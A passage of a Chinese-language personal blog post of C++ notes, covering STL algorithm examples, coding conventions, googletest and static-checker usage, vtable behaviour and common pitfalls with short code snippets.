class="built_in">end</span>(), <span class="number">3</span>, [](<span class="type">int</span> a, <span class="type">int</span> b) &#123; <span class="built_in">return</span> (a &gt; b); &#125;)</span><br><span class="line">    count = tmp.second - tmp.first;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="稳定分区-stable-partition"><a href="#稳定分区-stable-partition" class="headerlink" title="稳定分区 stable_partition"></a>稳定分区 stable_partition</h3><p>将符合表达式的元素前移，不符合表达式的后移，保持原本的相对位置不变</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">reOrderArray</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;array)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 奇数放前面，偶数放后面，两边分别的相对位置保持不变</span></span><br><span class="line">    <span class="built_in">stable_partition</span>(array.<span class="built_in">begin</span>(), array.<span class="built_in">end</span>(),</span><br><span class="line">                     [](<span class="type">const</span> <span class="type">int</span> &amp;value) &#123; <span class="built_in">return</span> (value % <span class="number">2</span> == <span class="number">1</span>); &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="大（小）根堆-make-heap-push-heap-pop-heap"><a href="#大（小）根堆-make-heap-push-heap-pop-heap" class="headerlink" title="大（小）根堆 make_heap&amp;push_heap&amp;pop_heap"></a><span id="bigHeap">大（小）根堆 make_heap&amp;push_heap&amp;pop_heap</span></h3><p>示例</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;array&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt; a = &#123;<span class="number">1</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">8</span>&#125;;</span><br><span class="line">    <span class="comment">// 默认是大根堆</span></span><br><span class="line">    std::<span class="built_in">make_heap</span>(a.<span class="built_in">begin</span>(), a.<span class="built_in">end</span>());</span><br><span class="line">    std::cout &lt;&lt; a[<span class="number">0</span>] &lt;&lt; std::endl;     <span class="comment">// 9</span></span><br><span class="line">    <span class="comment">// 小根堆，使用标准库的greater函数对标准类型设置比较函数</span></span><br><span class="line">    std::<span class="built_in">make_heap</span>(a.<span class="built_in">begin</span>(), a.<span class="built_in">end</span>(), std::<span class="built_in">greater</span>&lt;<span class="type">int</span>&gt;());</span><br><span class="line">    std::cout &lt;&lt; a[<span class="number">0</span>] &lt;&lt; std::endl;     <span class="comment">// 0</span></span><br><span class="line">    <span class="comment">// 自定义比较函数</span></span><br><span class="line">    <span class="comment">// 为true，b向堆顶移动；false，a向堆顶移动。</span></span><br><span class="line">    std::<span class="built_in">make_heap</span>(a.<span class="built_in">begin</span>(), a.<span class="built_in">end</span>(), [](<span class="type">const</span> <span class="type">int</span> &amp;a, <span class="type">const</span> <span class="type">int</span> &amp;b) -&gt; <span class="type">bool</span> &#123;</span><br><span class="line">        <span class="comment">// a比b大，返回true，b向堆顶移动，也就是小根堆</span></span><br><span class="line">        <span class="keyword">return</span> a &gt; b;</span><br><span class="line">    &#125;);</span><br><span class="line">    std::cout &lt;&lt; a[<span class="number">0</span>] &lt;&lt; std::endl;     <span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line">    std::<span class="built_in">make_heap</span>(a.<span class="built_in">begin</span>(), a.<span class="built_in">end</span>());</span><br><span class="line">    <span class="comment">// 出堆，将堆顶移到末尾，一定提前是make_heap后的</span></span><br><span class="line">    <span class="type">int</span> lastTop = a[<span class="number">0</span>];</span><br><span class="line">    std::<span class="built_in">pop_heap</span>(a.<span class="built_in">begin</span>(), a.<span class="built_in">end</span>());</span><br><span class="line">    a.<span class="built_in">pop_back</span>();</span><br><span class="line">    std::cout &lt;&lt; lastTop &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; a[<span class="number">0</span>] &lt;&lt; std::endl;  <span class="comment">// 9 8</span></span><br><span class="line">    <span class="comment">// 入堆，将末尾元素加到堆中，一定提前是make_heap后的</span></span><br><span class="line">    a.<span class="built_in">emplace_back</span>(<span class="number">9</span>);</span><br><span class="line">    std::<span class="built_in">push_heap</span>(a.<span class="built_in">begin</span>(), a.<span class="built_in">end</span>());</span><br><span class="line">    std::cout &lt;&lt; a[<span class="number">0</span>] &lt;&lt; std::endl;  <span class="comment">// 9</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="四、工程建议"><a href="#四、工程建议" class="headerlink" title="四、工程建议"></a>四、工程建议</h1><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><ul>
<li>所有代码文件最好使用 utf-8 编码，比较统一</li>
<li>需要使用中文打印的可能会要求 GB2312 等，单独列出一个头文件使用宏定义，单独使用相应的编码</li>
</ul>
<h2 id="公用常量、类型和方法"><a href="#公用常量、类型和方法" class="headerlink" title="公用常量、类型和方法"></a>公用常量、类型和方法</h2><ul>
<li>找一个单独的文件 constant.hpp 进行存放</li>
<li>定义较多分模块添加 constant 目录</li>
<li>使用<code>const + 类型</code>进行定义防止类型模糊使用</li>
<li>使用 inline 函数定义函数，防止类型混用</li>
</ul>
<h2 id="函数内部局部变量使用"><a href="#函数内部局部变量使用" class="headerlink" title="函数内部局部变量使用"></a>函数内部局部变量使用</h2><ul>
<li>C11 以上的标准可以在代码中间定义变量</li>
<li>需要用的地方进行定义，不放在函数头部定义，防止定义变量用不着导致内存浪费</li>
</ul>
<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><h3 id="文件头部描述"><a href="#文件头部描述" class="headerlink" title="文件头部描述"></a>文件头部描述</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @file xxx.hpp</span></span><br><span class="line"><span class="comment"> * @author abc (abc@163.com)</span></span><br><span class="line"><span class="comment"> * @brief xxx</span></span><br><span class="line"><span class="comment"> * @version 0.1</span></span><br><span class="line"><span class="comment"> * @date 2022-05-12</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @copyright Copyright (c) 2022</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<h3 id="方法和函数在头文件写注释"><a href="#方法和函数在头文件写注释" class="headerlink" title="方法和函数在头文件写注释"></a>方法和函数在头文件写注释</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 函数描述</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param 参数名称 参数描述</span></span><br><span class="line"><span class="comment"> * @param[in] 参数名称 参数描述</span></span><br><span class="line"><span class="comment"> * @param[in,out] 参数名称 参数描述</span></span><br><span class="line"><span class="comment"> * @param[out] 参数名称 参数描述</span></span><br><span class="line"><span class="comment"> * @return 返回值描述</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<h3 id="类内部属性在后面写注释"><a href="#类内部属性在后面写注释" class="headerlink" title="类内部属性在后面写注释"></a>类内部属性在后面写注释</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">type param = initValue; <span class="comment">//param描述</span></span><br></pre></td></tr></table></figure>

<h3 id="前缀"><a href="#前缀" class="headerlink" title="前缀"></a>前缀</h3><ul>
<li>类中的属性使用<code>m_</code></li>
<li>全局变量使用<code>g_</code></li>
<li>静态变量使用<code>s_</code></li>
<li>常量使用<code>c_</code></li>
<li>指针使用<code>p</code>开头</li>
<li>变量首字母小写，驼峰命名</li>
<li>函数动作名称开头，首字母小写，驼峰命名</li>
</ul>
<h2 id="参数判断"><a href="#参数判断" class="headerlink" title="参数判断"></a>参数判断</h2><ul>
<li>参数属于程序员错误，使用断言让错误发生前移</li>
<li>错误码功能单一，成功即成功，失败中不可有成功情况</li>
</ul>
<h1 id="五、好用的第三方库"><a href="#五、好用的第三方库" class="headerlink" title="五、好用的第三方库"></a>五、好用的第三方库</h1><h2 id="1-google-test"><a href="#1-google-test" class="headerlink" title="1. google test"></a>1. google test</h2><p><a href="https://github.com/google/googletest.git">https://github.com/google/googletest.git</a></p>
<h3 id="1-1-运行常用命令"><a href="#1-1-运行常用命令" class="headerlink" title="1.1. 运行常用命令"></a>1.1. 运行常用命令</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">展示所有用例</span></span><br><span class="line">=&gt; xxxTest --gtest_list_tests</span><br><span class="line">str1.</span><br><span class="line">  toString</span><br><span class="line">  toString2</span><br><span class="line">str2.</span><br><span class="line">  many_create_destroy</span><br><span class="line">  resolve_test_ok_1</span><br><span class="line">  resolve_timeout</span><br><span class="line">str3.</span><br><span class="line">  toString</span><br><span class="line">  toString2</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">仅执行部分用例</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">冒号用来添加用例，A:B 即 A和B都执行</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">不想要执行的只需要一个-号， C:-A:B 为执行C但不执行A和B</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">正则表达式需要加引号包裹，?代表一个匹配，*代表多个匹配，.还是点不代表任意字符</span></span><br><span class="line">=&gt; xxxTest --gtest_filter=IDnsResolver_DefaultImpl.toString:DnsResolver_DefaultImpl.toString2</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行strx.开头的所有，但不执行str1开头的和str2开头的</span></span><br><span class="line">=&gt; xxxTest --gtest_filter=&#x27;str?.*&#x27;:-&#x27;str1*&#x27;:&#x27;str2*&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-gtest的main函数"><a href="#1-2-gtest的main函数" class="headerlink" title="1.2. gtest的main函数"></a>1.2. gtest的main函数</h3><ul>
<li>参考<code>googletest/src/gtest_main.cc</code></li>
</ul>
<h1 id="六、静态检查"><a href="#六、静态检查" class="headerlink" title="六、静态检查"></a>六、静态检查</h1><h2 id="1-cpplint"><a href="#1-cpplint" class="headerlink" title="1. cpplint"></a>1. cpplint</h2><h3 id="1-1-忽略某一行"><a href="#1-1-忽略某一行" class="headerlink" title="1.1. 忽略某一行"></a>1.1. 忽略某一行</h3><ul>
<li>添加<code>// NOLINT</code></li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">print_currentTime</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">time_t</span> currentTime = <span class="built_in">time</span>(<span class="literal">NULL</span>);</span><br><span class="line">    tm *currentTm = <span class="built_in">localtime</span>(&amp;currentTime);    <span class="comment">// NOLINT</span></span><br><span class="line">    <span class="built_in">log_print</span>(<span class="string">&quot;%4d-%02d-%02d %02d:%02d:%02d&quot;</span>, currentTm-&gt;tm_year + <span class="number">1900</span>, currentTm-&gt;tm_mon + <span class="number">1</span>,</span><br><span class="line">              currentTm-&gt;tm_mday, currentTm-&gt;tm_hour, currentTm-&gt;tm_min, currentTm-&gt;tm_sec);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="踩坑记-1"><a href="#踩坑记-1" class="headerlink" title="踩坑记"></a>踩坑记</h3><h4 id="1-windows编译报gtest-lib-gtest-all-obj-error-LNK2038-mismatch-detected-for-RuntimeLibrary-value-MTd-StaticDebug-doesn-t-match-value-MDd-DynamicDebug-in-main-obj"><a href="#1-windows编译报gtest-lib-gtest-all-obj-error-LNK2038-mismatch-detected-for-RuntimeLibrary-value-MTd-StaticDebug-doesn-t-match-value-MDd-DynamicDebug-in-main-obj" class="headerlink" title="1) windows编译报gtest.lib(gtest-all.obj) : error LNK2038: mismatch detected for &#39;RuntimeLibrary&#39;: value &#39;MTd_StaticDebug&#39; doesn&#39;t match value &#39;MDd_DynamicDebug&#39; in main.obj"></a>1) windows编译报<code>gtest.lib(gtest-all.obj) : error LNK2038: mismatch detected for &#39;RuntimeLibrary&#39;: value &#39;MTd_StaticDebug&#39; doesn&#39;t match value &#39;MDd_DynamicDebug&#39; in main.obj</code></h4><ul>
<li>README.md中有写，cmake加入下面的选项即可</li>
</ul>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (WIN32)</span><br><span class="line">    <span class="comment"># For Windows: Prevent overriding the parent project&#x27;s compiler/linker settings</span></span><br><span class="line">    <span class="keyword">set</span>(gtest_force_shared_crt <span class="keyword">ON</span> CACHE BOOL <span class="string">&quot;&quot;</span> FORCE)</span><br><span class="line"><span class="keyword">endif</span>()</span><br></pre></td></tr></table></figure>

<h2 id="2-cppcheck"><a href="#2-cppcheck" class="headerlink" title="2. cppcheck"></a>2. cppcheck</h2><h3 id="1-1-忽略某一行-1"><a href="#1-1-忽略某一行-1" class="headerlink" title="1.1. 忽略某一行"></a>1.1. 忽略某一行</h3><ul>
<li>忽略一个错误</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">f</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> arr[<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// cppcheck-suppress arrayIndexOutOfBounds</span></span><br><span class="line">    arr[<span class="number">10</span>] = arr[<span class="number">10</span>] / <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>忽略多个错误</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">f</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> arr[<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// cppcheck-suppress[arrayIndexOutOfBounds,zerodiv]</span></span><br><span class="line">    arr[<span class="number">10</span>] = arr[<span class="number">10</span>] / <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="七、类的那些事（非基础知识）"><a href="#七、类的那些事（非基础知识）" class="headerlink" title="七、类的那些事（非基础知识）"></a>七、类的那些事（非基础知识）</h1><h2 id="1-虚表和虚指针"><a href="#1-虚表和虚指针" class="headerlink" title="1. 虚表和虚指针"></a>1. 虚表和虚指针</h2><ul>
<li>虚表是全局的，每个子类实现对应一个虚表，编译时确定</li>
<li>虚指针是在子类构造时初始化好的，存放于类的内存中</li>
<li>虚指针的初始化是在构造函数之前，因为构造函数内部可以调用对应的方法，所以需要先初始化虚指针</li>
<li>父类的纯虚函数在构造函数中不能被调用，因为父类构造时，虚指针指向父类的虚表，调用的是纯虚函数而非子类实现</li>
<li>子类构造后调用的父类的方法中，可以调用子类实现的纯虚函数，因为虽然实现在父类中，虚指针指向的是子类</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">A</span>() &#123;</span><br><span class="line">        <span class="built_in">func</span>();     <span class="comment">// 这里编译会出错，未定义A::func()</span></span><br><span class="line">        <span class="built_in">func1</span>();    <span class="comment">// 这里编译可以，但是会崩溃，因为此时虚指针指向父类虚表，调用的是纯虚函数</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">func1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="built_in">func</span>();  <span class="comment">// 这里如果是子类调用的func1就不会崩溃，虽然实现在父类中，但是虚指针指向子类虚表</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">func</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> : <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hhh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    A *b = <span class="keyword">new</span> <span class="built_in">B</span>();</span><br><span class="line">    b-&gt;<span class="built_in">func1</span>();</span><br><span class="line">    <span class="keyword">delete</span> b;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="踩坑记和小技巧"><a href="#踩坑记和小技巧" class="headerlink" title="踩坑记和小技巧"></a>踩坑记和小技巧</h1><h2 id="1-头文件不要-using-namespace"><a href="#1-头文件不要-using-namespace" class="headerlink" title="1. 头文件不要 using namespace"></a>1. 头文件不要 using namespace</h2><p>头文件使用<code>using namespace</code>会污染所有包含此头文件的文件</p>
<h2 id="2-参数传递看情况使用引用"><a href="#2-参数传递看情况使用引用" class="headerlink" title="2. 参数传递看情况使用引用"></a>2. 参数传递看情况使用引用</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">type <span class="title">function</span><span class="params">(<span class="type">const</span> type &amp;arg)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>引用的形式可以减少复制的过程</li>
<li>我自己的想法是对于超过 int 大小的变量使用引用的形式来传参。</li>
<li>对于部分对外的参数可以不使用引用比如</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">const</span> std::string <span class="title">toJson</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>

<h2 id="3-const-的使用"><a href="#3-const-的使用" class="headerlink" title="3. const 的使用"></a>3. const 的使用</h2><h3 id="外部不可更改"><a href="#外部不可更改" class="headerlink" title="外部不可更改"></a>外部不可更改</h3><p>对于引用传递的参数，为防止外部修改，加 const 修饰。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">const</span> type &amp;<span class="title">getArg</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>

<h3 id="内部不可更改"><a href="#内部不可更改" class="headerlink" title="内部不可更改"></a>内部不可更改</h3><p>对于 get 方法等内部参数不会被修改的方法，在后部加 const 修饰</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">const</span> std::string <span class="title">toJson</span><span class="params">()</span> <span class="type">const</span></span>;</span><br></pre></td></tr></table></figure>

<h2 id="4-参数赋值必须用自己的类型"><a href="#4-参数赋值必须用自己的类型" class="headerlink" title="4. 参数赋值必须用自己的类型"></a>4. 参数赋值必须用自己的类型</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//错误方式</span></span><br><span class="line"><span class="type">bool</span> arg = <span class="number">1</span>;</span><br><span class="line"><span class="comment">//正确方式</span></span><br><span class="line"><span class="type">bool</span> arg = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>

<h2 id="5-类的建立需要添加构造函数和删除构造函数"><a href="#5-类的建立需要添加构造函数和删除构造函数" class="headerlink" title="5. 类的建立需要添加构造函数和删除构造函数"></a>5. 类的建立需要添加构造函数和删除构造函数</h2><p>拷贝构造函数，允许被拷贝才需要添加</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">temp</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="comment">//允许拷贝</span></span><br><span class="line">        <span class="built_in">temp</span>(<span class="type">const</span> temp &amp;a) = <span class="keyword">default</span>;</span><br><span class="line">        <span class="comment">//不允许拷贝</span></span><br><span class="line">        <span class="built_in">temp</span>(<span class="type">const</span> temp &amp;a) = <span class="keyword">delete</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="6-类的内部属性需要初始化"><a href="#6-类的内部属性需要初始化" class="headerlink" title="6. 类的内部属性需要初始化"></a>6. 类的内部属性需要初始化</h2><p>在参数声明的地方初始化，参数列表是给自己写的构造函数用的，并根据需要删除或声明为私有默认构造函数。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//hpp</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">temp</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="built_in">temp</span>(<span class="type">const</span> type1 &amp;a);</span><br><span class="line">        <span class="comment">//如果需要</span></span><br><span class="line">        <span class="built_in">temp</span>() = <span class="keyword">delete</span>;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="comment">//或者</span></span><br><span class="line">        <span class="built_in">temp</span>();</span><br><span class="line"></span><br><span class="line">    type1 m_arg1 = type1InitValue;</span><br><span class="line">    type2 m_arg2 = type2InitValue;</span><br><span class="line">    type3 m_arg3 = type3InitValue;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//cpp</span></span><br><span class="line">temp::<span class="built_in">temp</span>(<span class="type">const</span> type1 &amp;a) : <span class="built_in">m_arg1</span>(a);</span><br></pre></td></tr></table></figure>

<h2 id="7-单例构建"><a href="#7-单例构建" class="headerlink" title="7. 单例构建"></a>7. 单例构建</h2><p>base&#x2F;BaseInstance.hpp 为一个模板类，用来给需要写为单例的类使用</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> BaseInstance_hpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BaseInstance_hpp</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> cb &#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">BaseNoCopy</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="built_in">BaseNoCopy</span>()&#123; &#125;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="built_in">BaseNoCopy</span>(<span class="type">const</span> BaseNoCopy &amp;obj);</span><br><span class="line">        <span class="built_in">BaseNoCopy</span>(BaseNoCopy *pObj);</span><br><span class="line">        <span class="built_in">BaseNoCopy</span>(<span class="type">const</span> BaseNoCopy *pObj);</span><br><span class="line">        BaseNoCopy&amp; <span class="keyword">operator</span> = (<span class="type">const</span> BaseNoCopy &amp;obj);</span><br><span class="line">        BaseNoCopy&amp; <span class="keyword">operator</span> = (<span class="type">const</span> BaseNoCopy *pObj);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt; <span class="keyword">class</span> <span class="title class_">BaseInstance</span>: <span class="keyword">public</span> BaseNoCopy &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="type">static</span> T &amp;<span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="type">static</span> T s_instance;</span><br><span class="line">            CreateObject.<span class="built_in">do_nothing</span>();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> s_instance;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">protected</span>:</span><br><span class="line">        <span class="built_in">BaseInstance</span>()&#123; &#125;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="built_in">BaseInstance</span>(<span class="type">const</span> BaseInstance &amp;obj);</span><br><span class="line">        BaseInstance <span class="keyword">operator</span> = (<span class="type">const</span> BaseInstance &amp;obj);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">ObjectCreator</span> &#123;</span><br><span class="line">            <span class="built_in">ObjectCreator</span>() &#123;</span><br><span class="line">                BaseInstance&lt;T&gt;::<span class="built_in">getInstance</span>();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">do_nothing</span><span class="params">()</span><span class="type">const</span></span>&#123; &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">static</span> ObjectCreator CreateObject;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line">    <span class="keyword">typename</span> BaseInstance&lt;T&gt;::ObjectCreator BaseInstance&lt;T&gt;::CreateObject;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* BaseInstance_hpp */</span></span></span><br></pre></td></tr></table></figure>

<p>使用方法</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">temp</span> : <span class="keyword">public</span> BaseInstance&lt;temp&gt;</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="8-do-while-作用域的问题"><a href="#8-do-while-作用域的问题" class="headerlink" title="8. do while 作用域的问题"></a>8. do while 作用域的问题</h2><p>do while 的大括号是一个作用域，其中定义的变量不能用做 while 判断</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//错误用法，a已经被释放</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">bool</span> a = <span class="literal">true</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125; <span class="keyword">while</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="comment">//正确用法，使用外部进行判断</span></span><br><span class="line"><span class="type">bool</span> b = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">bool</span> a = <span class="literal">true</span>;</span><br><span class="line">    ...</span><br><span class="line">    b = a;</span><br><span class="line">&#125; <span class="keyword">while</span>(b);</span><br></pre></td></tr></table></figure>

<h2 id="9-指针引用的作用域问题"><a href="#9-指针引用的作用域问题" class="headerlink" title="9. 指针引用的作用域问题"></a>9. 指针引用的作用域问题</h2><p>指针或者引用本身作用域可能要比指向的或者引用的变量作用域大，可能出现内存泄漏</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//错误示例</span></span><br><span class="line">std::shared_ptr&lt;Type&gt; pType = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    Type a;</span><br><span class="line">    pType = &amp;a;</span><br><span class="line">    ...</span><br><span class="line">&#125; <span class="keyword">while</span>(<span class="literal">false</span>);</span><br><span class="line">pType-&gt;<span class="built_in">function</span>();</span><br></pre></td></tr></table></figure>

<h2 id="10-C-的-switch-中的-case-有多条语句需要加大括号"><a href="#10-C-的-switch-中的-case-有多条语句需要加大括号" class="headerlink" title="10. C++的 switch 中的 case 有多条语句需要加大括号"></a>10. C++的 switch 中的 case 有多条语句需要加大括号</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (state) &#123;</span><br><span class="line">    <span class="keyword">case</span> state1:</span><br><span class="line">        <span class="built_in">op1</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> state2: &#123;</span><br><span class="line">        <span class="built_in">op1</span>();</span><br><span class="line">        <span class="built_in">op2</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">default</span>: &#123;</span><br><span class="line">        <span class="built_in">op1</span>();</span><br><span class="line">        <span class="built_in">op2</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="11-不对外暴露接口内实现"><a href="#11-不对外暴露接口内实现" class="headerlink" title="11. 不对外暴露接口内实现"></a>11. 不对外暴露接口内实现</h2><ul>
<li>class 的定义需要声明 private 和 public，对外只想暴露 public，不期望暴露 private</li>
<li>使用继承和工厂的方式，如下，仅暴露<code>func_public();</code>，外部从头文件无法看到<code>m_a</code></li>
</ul>
